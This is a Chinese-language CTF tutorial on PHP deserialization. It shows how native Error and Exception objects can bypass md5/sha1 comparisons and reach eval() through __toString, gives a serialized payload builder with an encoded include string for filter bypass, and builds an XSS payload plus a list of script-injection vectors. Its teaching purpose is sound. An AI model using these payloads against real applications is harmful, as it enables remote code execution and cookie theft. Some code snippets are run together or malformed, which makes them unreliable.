# ERROR类和exception类

顾名思义，error类是php中的报错类


exception为php中的异常类。


因为它内置有一个`__toString()`的方法，常用于PHP 反序列化中。


接下来介绍用法（欢迎补充姿势）


## 1 .md5()和sha1()绕过


md5函数的绕过应该大家都清楚，最常用的方法是null==null。


也就是传参的时候变为数组，然后使php解析报错


那么这里其实原理很为类似


***Error****是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。*


`Error::__construct`— 初始化 error 对象

* 
`Error::getMessage`— 获取错误信息

* 
`Error::getPrevious`— 返回先前的 Throwable

* 
`Error::getCode`— 获取错误代码

* 
`Error::getFile`— 获取错误发生时的文件

* 
`Error::getLine`— 获取错误发生时的行号

* 
`Error::getTrace`— 获取调用栈（stack trace）

* 
`Error::getTraceAsString`— 获取字符串形式的调用栈（stack trace）

* 
`Error::__toString`— error 的字符串表达

* 
`Error::__clone`— 克隆 error

* 
***Exception****是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。*


`Exception::__construct`— 异常构造函数

* 
`Exception::getMessage`— 获取异常消息内容

* 
`Exception::getPrevious`— 返回异常链中的前一个异常

* 
`Exception::getCode`— 获取异常代码

* 
`Exception::getFile`— 创建异常时的程序文件名称

* 
`Exception::getLine`— 获取创建的异常所在文件中的行号

* 
`Exception::getTrace`— 获取异常追踪信息

* 
`Exception::getTraceAsString`— 获取字符串类型的异常追踪信息

* 
`Exception::__toString`— 将异常对象转换为字符串

* 
`Exception::__clone`— 异常克隆

* 
两个函数均有__tostring类


稍微解释下：（暗示例子）


```plain
<?phperror_reporting(0);class SYCLOVER {        public $syc;    public $lover;       public function __wakeup()      {       if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) )      {                          if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match))           {eval($this->syc);}else {               die("Try Hard !!");           }                   }    }}if (isset($_GET['great'])) {    unserialize($_GET['great']);} else {    highlight_file(__FILE__);}?>

Plain Text
```



(看到这个syclover就想到那张大脸。。。）


比较典型的反序列化。


想要达成代码执行必须先通过上面的md5和sha1的比较匹配。


由于是因为在类中，数组是用不了的。


想想__tostring的调用方法：


当类被当成字符串时调用


于是我们构造一条链


unserilize->__wakeup()->error()类->__tostring->eval()函数


```plain
<phpclass SYCLOVER { public $syc; public $lover; $str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";} $a=new Error($str,1); $b=new Error($str,2);//原生类用在这里 $c = new SYCLOVER(); $c->syc = $a; $c->lover = $b;echo(urlencode(serialize($c)));?>
Plain Text
```



这就是最后的payload


这里应该是能看懂


ps:”?>”是因为ERROR报错类会跳出一长串不可预知的报错信息，需要命令执行的话需要用?>去闭合掉爆出来的杂七杂八的信息。~是取反符号绕过过滤。（理解一下，和异或很类似）。


eval("...Error: ?><?php payload ?>")


## 2.PHP7.0下的XSS


```plain
<?php$a = unserialize($_GET['whoami']);echo $a;?>
PHP
```



上面的代码只有一个简单的反序列化，并没有给出类，这时候一般都会去思考一下原生类。


```plain
<?php$a = new Error("<script>alert('xss')</script>");$b = serialize($a);echo urlencode($b);  ?>
Plain Text
```



然后报错把插入的XSS代码执行。


之后一般会用到XSS里面的知识模块例如：





<script>alert("内容")</script>    使用<script>标签，弹出消息对话框


<bodyonload=alert("内容")>    使用<body>标签，弹出消息对话框


<a href=“”onclick=alert(“内容”)>链接文字</a> 使用<a>标签，显示可点击链接，点击链接后弹出消息对话框


<imgsrc=WrongIP onerror=alert("内容")>   使用<img>标签，弹出消息对话框


<script>window.location.href="网站地址"</script>  使用<script>标签，重定向页面


<script>alert=(document.cookie)</script>   使用<script>标签，cookie获取


等等


例题可以看这个：（网上蛮多的我就不放了）
